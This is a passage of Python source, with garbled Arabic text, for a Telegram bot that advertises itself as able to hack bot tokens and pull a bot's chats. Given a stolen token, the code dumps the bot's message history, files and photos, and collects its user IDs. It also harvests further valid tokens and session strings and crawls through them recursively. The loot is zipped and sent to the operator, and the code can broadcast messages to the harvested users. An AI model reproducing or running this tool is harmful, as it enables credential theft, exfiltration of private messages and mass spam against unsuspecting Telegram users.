        # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
        main_analysis = await analyze_bot(main_bot_token, user_id)
        if not main_analysis['success']:
            return {'success': False, 'error': 'ÙØ´Ù„ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ'}
        
        all_bots = [{
            'token': main_bot_token,
            'analysis': main_analysis,
            'level': 0
        }]
        
        total_bots = 1
        processed_bots = 0
        last_update_time = 0
        
        # Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ù…Ø¬Ù…Ø¹Ø©
        aggregated_stats = {
            'total_bots': 1,
            'total_users': main_analysis['total_users'],
            'total_files': main_analysis['total_files'],
            'total_photos': main_analysis['total_photos'],
            'total_tokens': main_analysis['tokens']['total'],
            'valid_tokens': main_analysis['tokens']['valid'],
            'total_sessions': main_analysis['sessions']['total'],
            'all_users': set(main_analysis['user_ids']),
            'all_files': main_analysis['files'],
            'all_photos': main_analysis['photos'],
            'all_tokens': main_analysis['tokens']['details'],
            'all_sessions': main_analysis['sessions']['details']
        }
        
        # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØªÙØ±Ø¹Ø©
        current_level = 0
        max_levels = 10  # Ø£Ù‚ØµÙ‰ Ø¹Ù…Ù‚ Ù„Ù„ØªÙØ±Ø¹
        
        while current_level < max_levels:
            current_level_bots = [bot for bot in all_bots if bot['level'] == current_level]
            
            for bot_data in current_level_bots:
                # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø·Ù„Ø¨ Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù
                if stop_event and stop_event.is_set():
                    print("â¹ ØªÙ… Ø·Ù„Ø¨ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø¨ÙƒÙŠ")
                    # Ù†Ø¹ÙˆØ¯ Ø¨Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø­Ø§Ù„ÙŠØ© Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ø§Ù„ÙƒØ§Ù…Ù„
                    return {
                        'success': True,
                        'aggregated_stats': aggregated_stats,
                        'all_bots': all_bots,
                        'total_levels': current_level,
                        'partial': True,
                        'message': 'ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ù‚Ø¨Ù„ Ø§ÙƒØªÙ…Ø§Ù„Ù‡'
                    }
                
                current_tokens = bot_data['analysis']['tokens']['details']
                
                for token_info in current_tokens:
                    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø·Ù„Ø¨ Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø­Ù„Ù‚Ø©
                    if stop_event and stop_event.is_set():
                        print("â¹ ØªÙ… Ø·Ù„Ø¨ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø¨ÙƒÙŠ")
                        return {
                            'success': True,
                            'aggregated_stats': aggregated_stats,
                            'all_bots': all_bots,
                            'total_levels': current_level,
                            'partial': True,
                            'message': 'ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ù‚Ø¨Ù„ Ø§ÙƒØªÙ…Ø§Ù„Ù‡'
                        }
                    
                    if token_info['valid']:
                        token = token_info['token']
                        
                        # ØªØ¬Ù†Ø¨ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ÙƒØ±Ø±Ø©
                        if any(b['token'] == token for b in all_bots):
                            continue
                        
                        # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø¬Ø¯ÙŠØ¯
                        new_analysis = await analyze_bot(token, user_id)
                        if new_analysis['success']:
                            new_bot = {
                                'token': token,
                                'analysis': new_analysis,
                                'level': current_level + 1
                            }
                            all_bots.append(new_bot)
                            
                            # ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©
                            aggregated_stats['total_bots'] += 1
                            aggregated_stats['total_users'] += new_analysis['total_users']
                            aggregated_stats['total_files'] += new_analysis['total_files']
                            aggregated_stats['total_photos'] += new_analysis['total_photos']
                            aggregated_stats['total_tokens'] += new_analysis['tokens']['total']
                            aggregated_stats['valid_tokens'] += new_analysis['tokens']['valid']
                            aggregated_stats['total_sessions'] += new_analysis['sessions']['total']
                            
                            # Ø¯Ù…Ø¬ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†
                            aggregated_stats['all_users'].update(new_analysis['user_ids'])
                            
                            # Ø¯Ù…Ø¬ Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ØµÙˆØ±
                            aggregated_stats['all_files'].extend(new_analysis['files'])
                            aggregated_stats['all_photos'].extend(new_analysis['photos'])
                            
                            # Ø¯Ù…Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª ÙˆØ§Ù„Ø¬Ù„Ø³Ø§Øª
                            aggregated_stats['all_tokens'].extend(new_analysis['tokens']['details'])
                            aggregated_stats['all_sessions'].extend(new_analysis['sessions']['details'])
                            
                            processed_bots += 1
                            total_bots += 1
                            
                            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù…
                            current_time = time.time()
                            if progress_callback and (current_time - last_update_time >= 5):
                                last_update_time = current_time
                                if not await progress_callback(processed_bots, total_bots, current_level + 1):
                                    break
            
            current_level += 1
            if current_level >= max_levels:
                break
        
        return {
            'success': True,
            'aggregated_stats': aggregated_stats,
            'all_bots': all_bots,
            'total_levels': current_level,
            'partial': False,
            'message': 'ØªÙ… Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„ÙØ­Øµ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„'
        }
        
    except Exception as e:
        print(f"Error in deep network analysis: {e}")
        return {'success': False, 'error': str(e)}

async def network_broadcast(all_bots_data, message_text, progress_callback=None, stop_event=None):
    """Ø¥Ø°Ø§Ø¹Ø© Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    total_bots = len(all_bots_data)
    total_success = 0
    total_failed = 0
    
    last_update_time = 0
    
    for i, bot_data in enumerate(all_bots_data):
        if stop_event and stop_event.is_set():
            break
            
        try:
            users = bot_data['analysis']['user_ids']
            success, failed = await broadcast_message(
                bot_data['token'],
                users,
                message_text
            )
            
            total_success += success
            total_failed += failed
            
            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù…
            current_time = time.time()
            if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_bots):
                last_update_time = current_time
                if not await progress_callback(i + 1, total_bots, total_success, total_failed):
                    break
                    
        except Exception as e:
            print(f"Error broadcasting to bot {i}: {e}")
            total_failed += len(bot_data['analysis']['user_ids'])
    
    return total_success, total_failed

async def network_send_files(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_files = []
        for bot_data in all_bots_data:
            all_files.extend(bot_data['analysis']['files'])
        
        if not all_files:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª
        zip_buffer = io.BytesIO()
        success_count = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for bot_data in all_bots_data:
                if not bot_data['analysis']['files']:
                    continue
                    
                temp_session = os.path.join(SESSION_DIR, f"network_files_{int(time.time())}")
                temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
                await temp_bot.start(bot_token=bot_data['token'])
                
                for file_info in bot_data['analysis']['files']:
                    if await download_and_add_to_zip(temp_bot, file_info, zip_file, 'document'):
                        success_count += 1
                
                await temp_bot.disconnect()
                
                try:
                    if os.path.exists(f"{temp_session}.session"):
                        os.remove(f"{temp_session}.session")
                except:
                    pass
        
        zip_buffer.seek(0)
        
        if success_count > 0:
            await main_bot.send_file(
                entity=int(user_id),
                file=zip_buffer,
                caption=f"ğŸ“¦ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ© ({success_count} Ù…Ù„ÙØ§Øª)",
                attributes=[DocumentAttributeFilename("network_files.zip")]
            )
            return True
        
        return False
        
    except Exception as e:
        print(f"Error sending network files: {e}")
        return False

async def network_send_photos(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_photos = []
        for bot_data in all_bots_data:
            all_photos.extend(bot_data['analysis']['photos'])
        
        if not all_photos:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª
        zip_buffer = io.BytesIO()
        success_count = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for bot_data in all_bots_data:
                if not bot_data['analysis']['photos']:
                    continue
                    
                temp_session = os.path.join(SESSION_DIR, f"network_photos_{int(time.time())}")
                temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
                await temp_bot.start(bot_token=bot_data['token'])
                
                for photo_info in bot_data['analysis']['photos']:
                    if await download_and_add_to_zip(temp_bot, photo_info, zip_file, 'photo'):
                        success_count += 1
                
                await temp_bot.disconnect()
                
                try:
                    if os.path.exists(f"{temp_session}.session"):
                        os.remove(f"{temp_session}.session")
                except:
                    pass
        
        zip_buffer.seek(0)
        
        if success_count > 0:
            await main_bot.send_file(
                entity=int(user_id),
                file=zip_buffer,
                caption=f"ğŸ–¼ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ© ({success_count} ØµÙˆØ±)",
                attributes=[DocumentAttributeFilename("network_photos.zip")]
            )
            return True
        
        return False
        
    except Exception as e:
        print(f"Error sending network photos: {e}")
        return False

async def network_send_tokens(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_tokens = []
        for bot_data in all_bots_data:
            all_tokens.extend(bot_data['analysis']['tokens']['details'])
        
        if not all_tokens:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØµØ§Ù„Ø­Ø© ÙÙ‚Ø·
        valid_tokens = [token for token in all_tokens if token['valid']]
        
        if not valid_tokens:
            await main_bot.send_message(user_id, "âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ØªÙˆÙƒÙ†Ø§Øª ØµØ§Ù„Ø­Ø© ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
            return False
        
        # Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„ ØªÙˆÙƒÙ† Ù…Ø¹ Ø²Ø± Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©
        for token_info in valid_tokens:
            token = token_info['token']
            bot_info = token_info['bot_info']
            
            message = (
                "ğŸ‰ ØªÙˆÙƒÙ† Ø¨ÙˆØª ØµØ§Ù„Ø­ Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©!\n\n"
                f"ğŸ” Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªÙˆÙƒÙ†:\n`{token}`\n\n"
                f"ğŸ¤– Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª:\n"
                f"â”œ Ø§Ù„Ø§Ø³Ù…: {bot_info.get('bot_name', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”œ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: @{bot_info.get('bot_username', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”œğŸ“©Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {bot_info.get('total_messages', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”œğŸ‘¤Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”” Ø§Ù„Ø¢ÙŠØ¯ÙŠ: {bot_info.get('bot_id', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}"
            )
            
            # Ø²Ø± Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª
            broadcast_button = [[Button.inline("ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª", f"token_broadcast:{token}")]]
            await main_bot.send_message(user_id, message, buttons=broadcast_button)
            await asyncio.sleep(0.5)
        
        return True
        
    except Exception as e:
        print(f"Error sending network tokens: {e}")
        return False

async def network_send_sessions(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_sessions = []
        for bot_data in all_bots_data:
            all_sessions.extend(bot_data['analysis']['sessions']['details'])
        
        if not all_sessions:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„ÙØ±ÙŠØ¯Ø© Ù…Ø¹ Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø§Ù„ØªØ±ØªÙŠØ¨
        unique_sessions = []
        seen_sessions = set()
        
        for i, session_info in enumerate(all_sessions):
            if 'session' in session_info and session_info['session'] not in seen_sessions:
                unique_sessions.append(session_info['session'])
                seen_sessions.add(session_info['session'])
                
                # Ø¥Ø¶Ø§ÙØ© Ø§Ù„ÙØ§ØµÙ„ Ø¨ÙŠÙ† Ø§Ù„Ø¬Ù„Ø³Ø§Øª (Ù…Ø§Ø¹Ø¯Ø§ Ø§Ù„Ø£Ø®ÙŠØ±Ø©)
                if i < len(all_sessions) - 1:
                    unique_sessions.append("\n" + "-" * 40 + "\n")
        
        if not unique_sessions:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª ÙÙŠ Ù…Ù„Ù zip
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            if unique_sessions:
                zip_file.writestr("sessions.txt", "".join(unique_sessions))
        
        zip_buffer.seek(0)
        
        await main_bot.send_file(
            entity=int(user_id),
            file=zip_buffer,
            caption="ğŸ” Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©",
            attributes=[DocumentAttributeFilename("network_sessions.zip")]
        )
        
        return True
        
    except Exception as e:
        print(f"Error sending network sessions: {e}")
        return False

async def main():
    cleanup_sessions()

    session_name = os.path.join(SESSION_DIR, f"khalid_bot_{int(time.time())}")
    
    bot = TelegramClient(session_name, API_ID, API_HASH)
    
    user_states = {}
    stop_events = {}
    broadcast_messages = {}
    network_analysis_data = {}
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        user_id = event.sender_id
        if user_id in user_states:
            del user_states[user_id]
        if user_id in broadcast_messages:
            del broadcast_messages[user_id]
        user_states[user_id] = {'step': 'start'}
        await event.respond("ğŸ‰Ø¯Ø§ Ø¨ÙˆØª Ù‚Ø§Ø¯Ø± Ø¹ ØªÙ‡ÙƒÙŠØ± ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª ÙˆØ³Ø­Ø¨ Ø¬Ù…ÙŠØ¹ Ù…Ø­ØªØ¯Ø«Ø§Øª Ø§Ù„Ø¨ÙˆØª ÙˆØ±Ø³Ø§ÙŠÙ„Ù‡ğŸš€\n\n"
                          "ğŸ‘¨â€ğŸ’» Ø§Ù„Ù…Ø·ÙˆØ±: @Khalidd_sw\n\n"
                          "ğŸ“ Ø¹Ø´Ø§Ù† ØªØ³ØªØ®Ø¯Ù…Ù‡:\n"
                          "1ï¸âƒ£ Ø§ÙƒØªØ¨ /dump Ø¹Ø´Ø§Ù† Ù†Ø¨Ø¯Ø£ Ø³Ø­Ø¨ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„\n"
                          "2ï¸âƒ£ Ù‡ØªÙƒØªØ¨ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ù„ÙŠ Ø¹Ø§ÙŠØ² ØªØ³Ø­Ø¨ Ù…Ù†Ù‡\n"
                          "3ï¸âƒ£ Ø¨Ø¹Ø¯ÙŠÙ† Ù‡ØªÙƒØªØ¨ ID Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù„ÙŠ Ø¹Ø§ÙŠØ² ØªÙ†Ù‚Ù„Ù„Ù‡\n"
                          "4ï¸âƒ£ Ù‡Ø¬ÙŠØ¨Ù„Ùƒ Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù„ÙŠ Ù…ÙˆØ¬ÙˆØ¯Ù‡\n"
                          "5ï¸âƒ£ Ø§Ø®ØªØ§Ø± Ø§Ù†Øª Ø¹Ø§ÙŠØ² ØªÙ†Ù‚Ù„ Ù…Ù† ÙƒØ§Ù… Ù„ÙƒØ§Ù…")

    @bot.on(events.NewMessage(pattern='/dump'))
    async def dump_handler(event):
        user_id = event.sender_id
        if user_id in user_states:
            del user_states[user_id]
        user_states[user_id] = {'step': 'waiting_token'}
        await event.respond("ğŸ”‘  Ø§Ø¯Ø®Ù„ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ù„ÙŠ Ø¹Ø§ÙŠØ² ØªØ³Ø­Ø¨ Ø±Ø³Ø§ÙŠÙ„Ù‡\n"
                          "Ù…Ø«Ø§Ù„: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz\n\n")

    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')
        
        if user_id not in user_states or 'token' not in user_states[user_id]:
            await event.answer("âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ Ù…Ø§ Ø¨Ø¯Ø£ØªØ´ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ø¹Ø¯. Ø§Ø¨Ø¯Ø£ Ø¨ÙƒØªØ§Ø¨Ø© /dump")
            return
            
        bot_token = user_states[user_id]['token']
        
        if data == 'stop':
            if user_id in stop_events:
                stop_events[user_id].set()
                await event.answer("â¹ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¹Ù…Ù„ÙŠØ©")
            return
            
        if data == 'all_messages':
            if 'max_id' not in user_states[user_id]:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø±Ø³Ø§Ø¦Ù„. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
                
            max_id = user_states[user_id]['max_id']
            user_states[user_id]['start_id'] = 1
            user_states[user_id]['end_id'] = max_id
            
            stop_events[user_id] = asyncio.Event()
            
            await event.answer("ğŸš€ Ø¨Ø¯Ø¡ Ù†Ù‚Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„...")
            
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            progress_msg = await event.edit("ğŸš€ Ø¨Ø¯Ø¡ Ù†Ù‚Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù…Ù† 1 Ø¥Ù„Ù‰ {}...".format(max_id), buttons=stop_button)
            
            last_update_time = 0
            async def update_progress(current, total):
                nonlocal last_update_time
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                if current_time - last_update_time >= 5 or current == total:
                    last_update_time = current_time
                    percent = (current / total) * 100
                    await progress_msg.edit("ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ù†Ù‚Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {}/{} ({:.1f}%)".format(current, total, percent), buttons=stop_button)
                return True
            
            try:
                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
                source_bot = TelegramClient(source_session, API_ID, API_HASH)
                await source_bot.start(bot_token=bot_token)
                
                success, failed = await get_chat_history(
                    source_bot, 
                    1, 
                    max_id, 
                    user_id,
                    update_progress,
                    stop_events.get(user_id)
                )
                
                await source_bot.disconnect()
                
                try:
                    if os.path.exists(f"{source_session}.session"):
                        os.remove(f"{source_session}.session")
                except:
                    pass
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit("ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ!\nâœ… Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ Ù†Ù‚Ù„ {} Ø±Ø³Ø§Ù„Ø©\nâŒ ÙØ´Ù„Ù†Ø§ ÙÙŠ Ù†Ù‚Ù„ {} Ø±Ø³Ø§Ù„Ø©".format(success, failed))
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit("âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙˆÙ‚Øª Ù†Ù‚Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {}".format(str(e)))
            
        elif data == 'send_files':
            await event.answer("ğŸ“¦ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª...")
            
            try:
                if 'analysis' not in user_states[user_id] or 'files' not in user_states[user_id]['analysis']:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„Ù…Ù„ÙØ§Øª. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
                source_bot = TelegramClient(source_session, API_ID, API_HASH)
                await source_bot.start(bot_token=bot_token)
                
                files = user_states[user_id]['analysis']['files']
                if files:
                    await send_zip_files(
                        bot,  
                        source_bot,  
                        files, 
                        "bot_files", 
                        "ğŸ“¦ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø§Ù„Ø¨ÙˆØª",
                        user_id,
                        'document'
                    )
                    await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª")
                else:
                    await event.answer("âŒ Ù…Ø§ Ù„Ù‚ÙŠØªØ´ Ø£ÙŠ Ù…Ù„ÙØ§Øª")
                
                await source_bot.disconnect()
                
                try:
                    if os.path.exists(f"{source_session}.session"):
                        os.remove(f"{source_session}.session")
                except:
                    pass
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
            
        elif data == 'send_photos':
            await event.answer("ğŸ–¼ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±...")
            
            try:
                if 'analysis' not in user_states[user_id] or 'photos' not in user_states[user_id]['analysis']:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„ØµÙˆØ±. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
                source_bot = TelegramClient(source_session, API_ID, API_HASH)
                await source_bot.start(bot_token=bot_token)
                
                photos = user_states[user_id]['analysis']['photos']
                if photos:
                    await send_zip_files(
                        bot,  
                        source_bot,  
                        photos, 
                        "bot_photos", 
                        "ğŸ–¼ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„Ø¨ÙˆØª",
                        user_id,
                        'photo'
                    )
                    await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±")
                else:
                    await event.answer("âŒ Ù…Ø§ Ù„Ù‚ÙŠØªØ´ Ø£ÙŠ ØµÙˆØ±")
                
                await source_bot.disconnect()
                
                try:
                    if os.path.exists(f"{source_session}.session"):
                        os.remove(f"{source_session}.session")
                except:
                    pass
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
            
        elif data == 'send_sessions':
            await event.answer("ğŸ” Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª...")
            
            try:
                if 'analysis' not in user_states[user_id]:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„Ø¬Ù„Ø³Ø§Øª. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                zip_buffer = io.BytesIO()
                
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                    if 'sessions' in user_states[user_id]['analysis']:
                        sessions = user_states[user_id]['analysis']['sessions']['details']
                        chat_sessions = []
                        seen_sessions = set()
                        
                        for session in sessions:
                            if session.get('source') == 'chat':
                                session_text = session['session']
                                if session_text not in seen_sessions:
                                    seen_sessions.add(session_text)
                                    chat_sessions.append(session_text)
                        
                        if chat_sessions:
                            separated_sessions = []
                            for i, session in enumerate(chat_sessions):
                                separated_sessions.append(session)
                                if i < len(chat_sessions) - 1:
                                    separated_sessions.append("\n" + "-" * 40 + "\n")
                            
                            zip_file.writestr("sessions.txt", "\n".join(separated_sessions))
                
                zip_buffer.seek(0)
                
                await bot.send_file(
                    entity=user_id,
                    file=zip_buffer,
                    caption="ğŸ” Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø±Ø¬Ø© Ù…Ù† Ø§Ù„Ø¨ÙˆØª",
                    attributes=[DocumentAttributeFilename("sessions.zip")]
                )
                
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª")
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
            
        elif data == 'send_users':
            await event.answer("ğŸ‘¥ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†...")
            
            try:
                if 'analysis' in user_states[user_id] and 'user_ids' in user_states[user_id]['analysis']:
                    users = user_states[user_id]['analysis']['user_ids']
                else:
                    users = await extract_users_from_bot(bot_token, user_id)
                
                if users:
                    filename = f"user_ids_{user_id}.txt"
                    await save_user_ids_to_file(users, filename)
                    
                    buttons = [
                        [Button.inline("Ø§Ø°Ø§Ø¹Ù‡ğŸ“¢", "broadcast")]
                    ]
                    
                    await bot.send_file(
                        entity=user_id,
                        file=filename,
                        caption="ğŸ‘¥ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù…Ù† Ø§Ù„Ø¨ÙˆØª ({})".format(len(users)),
                        attributes=[DocumentAttributeFilename("users.txt")],
                        buttons=buttons
                    )
                    
                    user_states[user_id]['users_list'] = users
                    
                    try:
                        os.remove(filename)
                    except:
                        pass
